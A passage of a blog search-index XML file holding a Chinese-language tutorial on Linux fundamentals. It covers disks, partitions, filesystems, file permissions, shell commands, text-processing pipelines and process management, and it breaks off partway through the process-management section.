<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux系统基础知识]]></title>
    <url>%2Flinux_ops%2Flinux_base%2F</url>
    <content type="text"><![CDATA[一、常用操作以及概念 快捷键 求助 关机 PATH sudo 包管理工具 发行版 VIM 三个模式 GNU 开源协议 二、磁盘 HDD 磁盘接口 磁盘的文件名 三、分区 分区表 开机检测程序 四、文件系统 分区与文件系统 组成 文件读取 磁盘碎片 block inode 目录 日志 挂载 目录配置 五、文件 文件属性 文件时间 文件与目录的基本操作 修改权限 文件默认权限 目录的权限 链接 获取文件内容 指令与文件搜索 六、压缩与打包 压缩文件名 压缩指令 打包 七、Bash 特性 变量操作 指令搜索顺序 数据流重定向 八、管线指令 提取指令 排序指令 双向输出重定向 字符转换指令 分区指令 九、正则表达式 grep printf awk 十、进程管理 查看进程 进程状态 SIGCHLD wait() waitpid() 孤儿进程 僵死进程 十一、I/O 复用 概念理解 I/O 模型 select poll epoll select 和 poll 比较 eopll 工作模式 select poll epoll 应用场景 参考资料 一、常用操作以及概念快捷键 Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF） 求助1. –help指令的基本用法与选项介绍。 2. manman 是 manual 的缩写，将指令的具体信息显示出来。 当执行man date时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下： 代号 类型 1 用户在 shell 环境中可以操作的指令或者可执行文件 5 配置文件 8 系统管理员可以使用的管理指令 3. infoinfo 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。 4. doc/usr/share/doc 存放着软件的一整套说明文件。 关机1. who在关机前需要先使用 who 命令查看有没有其它用户在线。 2. sync为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。 3. shutdown12345# shutdown [-krhc] 时间 [信息]-k ： 不会关机，只是发送警告信息，通知所有在线的用户-r ： 将系统的服务停掉后就重新启动-h ： 将系统的服务停掉后就立即关机-c ： 取消已经在进行的 shutdown 指令内容 PATH可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。 1/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin sudosudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。 包管理工具RPM 和 DPKG 为最常见的两类软件包管理工具。RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为很多 Linux 系统 (RHEL) 的既定软件标准。与 RPM 进行竞争的是基于 Debian 操作系统 (UBUNTU) 的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。 YUM 基于 RPM，具有依赖管理功能，并具有软件升级的功能。 发行版Linux 发行版是 Linux 内核及各种应用软件的集成版本。 基于的包管理工具 商业发行版 社区发行版 DPKG Ubuntu Debian RPM Red Hat Fedora / CentOS VIM 三个模式 一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下 “i” 等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下 “:” 按键之后进入，用于保存退出等操作。 在指令列模式下，有以下命令用于离开或者保存文件。 命令 作用 :w 写入磁盘 :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关 :q 离开 :q! 强制离开不保存 :wq 写入磁盘后离开 :wq! 强制写入磁盘后离开 GNUGNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议，包含了以下内容： 以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。 开源协议 Choose an open source license 如何选择开源许可证？ 二、磁盘HDDDecoding UCS Invicta – Part 1 Hard Disk Drives(HDD) 俗称硬盘，具有以下结构： 盘面（Platter）：一个硬盘有多个盘面； 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道； 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小； 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）； 制动手臂（Actuator arm）：用于在磁道之间移动磁头； 主轴（Spindle）：使整个盘面转动。 磁盘接口1. IDEIDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。 2. SATASATA 全称 Serial ATA，也就是使用串口的 ATA 接口，因抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能，SATA-II 的接口速度为 300MiB/s，而新的 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。 3. SCSISCSI 全称是 Small Computer System Interface（小型机系统接口），经历多代的发展，从早期的 SCSI-II，到目前的 Ultra320 SCSI 以及 Fiber-Channel（光纤通道），接口型式也多种多样。SCSI 硬盘广为工作站级个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且资料传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。 4. SASSAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也透过缩小连接线改善系统内部空间等。 磁盘的文件名Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下： IDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p] 其中文件名后面的序号的确定与系统侦测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。 三、分区分区表磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。 1. MBRMBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中 MBR 占 446 bytes，分区表占 64 bytes。 分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它将其它扇区用来记录分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。 Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。 2. GPT不同的磁盘有不同的扇区大小，例如 512 bytes 和最新磁盘的 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。 GPT 第 1 个区块记录了 MBR，紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。 GPT 没有扩展分区概念，都是主分区，每个 LAB 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。 MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233 TB = 8 ZB。 开机检测程序1. BIOSBIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入与硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。 BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的 MBR，由 MBR 执行 MBR 中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。 MBR 中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现了多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动 MBR 中的开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。 下图中，第一扇区的 MBR 中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。 安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉 MBR，而 Linux 可以选择将开机管理程序安装在 MBR 或者其它分区的启动扇区，并且可以设置开机管理程序的选单。 2. UEFIBIOS 不可以读取 GPT 分区表，而 UEFI 可以。 四、文件系统分区与文件系统对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。 组成 最主要的几个组成部分如下： inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。 除此之外还包括： superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位域； 文件读取对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中去查找文件内容所在的所有 block，然后把所有 block 的内容读出来。 而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。 磁盘碎片指一个文件内容所在的 block 过于分散。 block在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。 大小 1KB 2KB 4KB 最大单一文件 16GB 256GB 2TB 最大文件系统 2TB 8TB 16TB 一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。 inodeinode 具体包含以下信息： 权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近一次的读取时间 (atime)； 最近修改的时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID…； 该文件真正内容的指向 (pointer)。 inode 具有以下特点： 每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。 inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用是指，让 inode 记录的引用 block 块当成 inode 用来记录引用信息。 目录建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。可以看出文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的 w 权限有关。 日志如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。 ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。 挂载挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。 目录配置为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下： / (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。 五、文件文件属性用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。 使用 ls 查看一个文件时，会显示一个文件的信息，例如 drwxr-xr-x. 3 root root 17 May 6 00:14 .config，对这个信息的解释如下： drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段。 3：链接数； root：文件拥有者； root：所属群组； 17：文件大小； May 6 00:14：文件最后被修改的时间； .config：文件名。 常见的文件类型及其含义有： d：目录； -：文件； l：链接文件； 9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。 文件时间 modification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。 文件与目录的基本操作1. ls列出文件或者目录的信息，目录的信息就是其中包含的文件。 1234# ls [-aAdfFhilnrRSt] file|dir-a ：列出全部的文件-d ：仅列出目录本身-l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd更换当前目录。 1cd [相对路径或绝对路径] 3. mkdir创建目录。 123# mkdir [-mp] 目录名称-m ：配置目录权限-p ：递归创建目录 4. rmdir删除目录，必须为空。 12rmdir [-p] 目录名称-p ：递归删除目录 5. touch更新文件时间或者建立新文件。 123456# touch [-acdmt] filename-a ： 更新 atime-c ： 更新 ctime，若该文件不存在则不建立新文件-m ： 更新 mtime-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date="日期或时间"-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp复制文件。 如果源文件有两个以上，则目的文件一定要是目录才行。 12345678cp [-adfilprsu] source destination-a ：相当于 -dr --preserve=all 的意思，至于 dr 请参考下列说明-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身-i ：若目标文件已经存在时，在覆盖前会先询问-p ：连同文件的属性一起复制过去-r ：递归持续复制-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了 7. rm删除文件。 12# rm [-fir] 文件或目录-r ：递归删除 8. mv移动文件。 123# mv [-fiu] source destination# mv [options] source1 source2 source3 .... directory-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。 1# chmod [-R] xyz dirname/filename 范例：将 .bashrc 文件的权限修改为 -rwxr-xr–。 1# chmod 754 .bashrc 也可以使用符号来设定权限。 12345678# chmod [ugoa] [+-=] [rwx] dirname/filename- u：拥有者- g：所属群组- o：其他人- a：所有人- +：添加权限- -：移除权限- =：设定权限 范例：为 .bashrc 文件的所有用户添加写权限。 1# chmod a+w .bashrc 文件默认权限 文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。 可以通过 umask 设置或者查看文件的默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r–。 目录的权限文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。 目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。 链接123# ln [-sf] source_filename dist_filename-s ：默认是 hard link，加 -s 为 symbolic link-f ：如果目标文件存在时，先删除目标文件 1. 实体链接它和普通文件类似，实体链接文件的 inode 都指向源文件所在的 block 上，也就是说读取文件直接从源文件的 block 上读取。 删除任意一个条目，文件还是存在，只要引用数量不为 0。 有以下限制：不能跨越 File System、不能对目录进行链接。 1234# ln /etc/crontab .# ll -i /etc/crontab crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。 当源文件被删除了，链接文件就打不开了。 可以为目录建立链接。 123# ll -i /etc/crontab /root/crontab234474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab 获取文件内容1. cat取得文件内容。 12# cat [-AbEnTv] filename-n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac是 cat 的反向操作，从最后一行开始打印。 3. more和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。 4. less和 more 类似，但是多了一个向前翻页的功能。 5. head取得文件前几行。 12# head [-n number] filename-n ：后面接数字，代表显示几行的意思 6. tail是 head 的反向操作，只是取得是后几行。 7. od以字符或者十六进制的形式显示二进制文件。 指令与文件搜索1. which指令搜索。 12# which [-a] command-a ：将所有指令列出，而不是只列第一个 2. whereis文件搜索。速度比较快，因为它只搜索几个特定的目录。 1# whereis [-bmsu] dirname/filename 3. locate文件搜索。可以用关键字或者正则表达式进行搜索。 locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。 12# locate [-ir] keyword-r：正则表达式 4. find文件搜索。可以使用文件的属性和权限进行搜索。 12# find [basedir] [option]example: find . -name "shadow*" （一）与时间有关的选项 1234-mtime n ：列出在 n 天前的那一天修改过内容的文件-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件-newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下： （二）与文件拥有者和所属群组有关的选项 123456-uid n-gid n-user name-group name-nouser ：搜索拥有者不存在 /etc/passwd 的文件-nogroup：搜索所属群组不存在于 /etc/group 的文件 （三）与文件权限和名称有关的选项 123456-name filename-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k-type TYPE-perm mode ：搜索权限等于 mode 的文件-perm -mode ：搜索权限包含 mode 的文件-perm /mode ：搜索权限包含任一 mode 的文件 六、压缩与打包压缩文件名Linux 底下有很多压缩文件名，常见的如下： 扩展名 压缩程序 *.Z compress *.zip zip *.gz gzip *.bz2 bzip2 *.xz xz *.tar tar 程序打包的数据，没有经过压缩 *.tar.gz tar 程序打包的文件，经过 gzip 的压缩 *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩 *.tar.xz tar 程序打包的文件，经过 xz 的压缩 压缩指令1. gzipgzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。 经过 gzip 压缩过，源文件就不存在了。 有 9 个不同的压缩等级可以使用。 可以使用 zcat、zmore、zless 来读取压缩文件的内容。 123456$ gzip [-cdtv#] filename-c ：将压缩的数据输出到屏幕上-d ：解压缩-t ：检验压缩文件是否出错-v ：显示压缩比等信息-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2提供比 gzip 更高的压缩比。 查看命令：bzcat、bzmore、bzless、bzgrep。 12$ bzip2 [-cdkzv#] filename-k ：保留源文件 3. xz提供比 bzip2 更佳的压缩比。 可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。 查看命令：xzcat、xzmore、xzless、xzgrep。 1$ xz [-dtlkc#] filename 打包压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gip、bzip2、xz 将打包文件进行压缩。 123456789101112$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩-z ：使用 zip；-j ：使用 bzip2；-J ：使用 xz；-c ：新建打包文件；-t ：查看打包文件里面有哪些文件；-x ：解打包或解压缩的功能；-v ：在压缩/解压缩的过程中，显示正在处理的文件名；-f : filename：要处理的文件；-C 目录 ： 在特定目录解压缩。 使用方式 命令 打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称 查 看 tar -jtv -f filename.tar.bz2 解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录 七、Bash可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。 特性 命令历史：记录使用过的命令。本次登录所执行的命令都会暂时存放到内存中，~/.bash_history 文件中记录的是前一次登录所执行过的命令。 命令与文件补全：快捷键：tab。 命名别名：例如 lm 是 ls -al 的别名。 shell scripts。 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件。 变量操作对一个变量赋值直接使用 =。 对变量取用需要在变量前加上 \$ ，也可以用 \${} 的形式； 输出变量使用 echo 命令。 123$ var=abc$ echo $var$ echo $&#123;var&#125; 变量内容如果有空格，必须需要使用双引号或者单引号。 双引号内的特殊字符可以保留原本特性，例如 var=”lang is \$LANG”，则 var 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 var=’lang is \$LANG’，则 var 的值为 lang is \$LANG。 可以使用 `指令` 或者 \$(指令) 的方式将指令的执行结果赋值给变量。例如 version=\$(uname -r)，则 version 的值为 3.10.0-229.el7.x86_64。 可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。 Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令： 12345$ declare [-aixr] variable-a ： 定义为数组类型-i ： 定义为整数类型-x ： 定义为环境变量-r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作： 123$ array[1]=a$ array[2]=b$ echo $&#123;array[1]&#125; 指令搜索顺序 以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内建的指令来执行； 按 \$PATH 变量指定的搜索路径的顺序找到第一个指令来执行。 数据流重定向重定向指的是使用文件代替标准输入、标准输出和标准错误输出。 1 代码 运算符 标准输入 (stdin) 0 &lt; 或 &lt;&lt; 标准输出 (stdout) 1 &gt; 或 &gt;&gt; 标准错误输出 (stderr) 2 2&gt; 或 2&gt;&gt; 其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。 可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。 如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。 1$ find /home -name .bashrc &gt; list 2&gt;&amp;1 八、管线指令管线是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管线。在命令之间使用 | 分隔各个管线命令。 1$ ls -al /etc | less 提取指令cut 对数据进行切分，取出想要的部分。切分过程一行一行地进行。 1234$ cut-d ：分隔符-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间-c ：以字符为单位取出区间 范例 1：last 将显示的登入者的信息，要求仅显示用户名。 123456$ lastroot pts/1 192.168.201.101 Sat Feb 7 12:35 still logged inroot pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)$ last | cut -d ' ' -f 1 范例 2：将 export 输出的讯息，取得第 12 字符以后的所有字符串。 12345678$ exportdeclare -x HISTCONTROL="ignoredups"declare -x HISTSIZE="1000"declare -x HOME="/home/dmtsai"declare -x HOSTNAME="study.centos.vbird".....(其他省略).....$ export | cut -c 12 排序指令sort 进行排序。 123456789$ sort [-fbMnrtuk] [file or stdin]-f ：忽略大小写-b ：忽略最前面的空格-M ：以月份的名字来排序，例如 JAN，DEC-n ：使用数字-r ：反向排序-u ：相当于 unique，重复的内容只出现一次-t ：分隔符，默认为 tab-k ：指定排序的区间 范例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。 12345$ cat /etc/passwd | sort -t ':' -k 3root:x:0:0:root:/root:/bin/bashdmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bashalex:x:1001:1002::/home/alex:/bin/basharod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。 123$ uniq [-ic]-i ：忽略大小写-c ：进行计数 范例：取得每个人的登录总次数 1234567$ last | cut -d ' ' -f 1 | sort | uniq -c16 (unknown47 dmtsai4 reboot7 root1 wtmp 双向输出重定向输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。 1$ tee [-a] file 字符转换指令tr 用来删除一行中的字符，或者对字符进行替换。 12$ tr [-ds] SET1 ...-d ： 删除行中 SET1 这个字符串 范例，将 last 输出的信息所有小写转换为大写。 1$ last | tr '[a-z]' '[A-Z]' col 将 tab 字符转为空格字符。 12$ col [-xb]-x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。 12$ expand [-t] file-t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。 12345$ join [-ti12] file1 file2-t ：分隔符，默认为空格-i ：忽略大小写的差异-1 ：第一个文件所用的比较字段-2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。 12$ paste [-d] file1 file2-d ：分隔符，默认为 tab 分区指令split 将一个文件划分成多个文件。 1234$ split [-bl] file PREFIX-b ：以大小来进行分区，可加单位，例如 b, k, m 等-l ：以行数来进行分区。- PREFIX ：分区文件的前导名称 九、正则表达式grep使用正则表示式把匹配的行提取出来。 1234567$ grep [-acinv] [--color=auto] 搜寻字符串 filename-a ： 将 binary 文件以 text 文件的方式进行搜寻-c ： 计算找到个数-i ： 忽略大小写-n ： 输出行号-v ： 反向选择，亦即显示出没有 搜寻字符串 内容的那一行--color=auto ：找到的关键字加颜色显示 范例：把含有 the 字符串的行提取出来（注意默认会有 –color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串） 123456$ grep -n 'the' regular_express.txt8:I can't finish the test.12:the symbol '*' is represented as start.15:You are the best is mean you are the no. 1.16:The world Happy is the same with "glad".18:google is the best tools for search keyword 因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。 1$ grep -n 'go\&#123;2,5\&#125;g' regular_express.txt printf用于格式化输出。 它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。 1234$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。 1$ awk '条件类型 1 &#123;动作 1&#125; 条件类型 2 &#123;动作 2&#125; ...' filename awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：\$n，n 为字段号，从 1 开始，\$0 表示一整行。 范例 1：取出登录用户的用户名和 ip 12345678$ last -n 5dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged indmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)$ last -n 5 | awk '&#123;print $1 "\t" $3&#125; awk 变量： 变量名称 代表意义 NF 每一行拥有的字段总数 NR 目前所处理的是第几行数据 FS 目前的分隔字符，默认是空格键 范例 2：输出正在处理的行号，并显示每一行有多少字段 123456$ last -n 5 | awk '&#123;print $1 "\t lines: " NR "\t columns: " NF&#125;'dmtsai lines: 1 columns: 10dmtsai lines: 2 columns: 10dmtsai lines: 3 columns: 10dmtsai lines: 4 columns: 10dmtsai lines: 5 columns: 9 可以使用条件，其中等于使用 ==。 范例 3：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。 1234$ cat /etc/passwd | awk &apos;BEGIN &#123;FS=&quot;:&quot;&#125; $3 &lt; 10 &#123;print $1 &quot;\t &quot; $3&#125;&apos;root 0bin 1daemon 2 十、进程管理查看进程1. ps查看某个时间点的进程信息 示例一：查看自己的进程 1# ps -l 示例二：查看系统所有进程 1# ps aux 示例三：查看特定的进程 1# ps aux | grep threadx 2. top实时显示进程信息 示例：两秒钟刷新一次 1# top -d 2 3. pstree查看进程树 示例：查看所有进程树 1# pstree -A 4. netstat查看占用端口的进程 1# netstat -anp | grep port 进程状态 状态 说明 R running or runnable (on run queue) D uninterruptible sleep (usually IO) S interruptible sleep (waiting for an event to complete) Z defunct/zombie, terminated but not reaped by its parent T stopped, either by a job control signal or because it is being traced SIGCHLD当一个子进程改变了它的状态时：停止运行，继续运行或者退出，有两件事会发生在父进程中： 得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。 其中子进程发送的 SIGCHLD 信号包含了子进程的信息，包含了进程 ID、进程状态、进程使用 CPU 的时间等。 在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息。父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。 wait()1pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。 如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 - 1，同时 errno 被置为 ECHILD。 参数 status 用来保存被收集进程退出时的一些状态，如果我们对这个子进程是如何死掉的毫不在意，只想把这个僵尸进程消灭掉，我们就可以设定这个参数为 NULL： 1pid = wait(NULL); waitpid()1pid_t waitpid(pid_t pid,int *status,int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。 pid 参数指示一个子进程的 ID，表示只关心这个子进程的退出 SIGCHLD 信号。如果 pid=-1 时，那么贺 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。 options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。 孤儿进程一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。 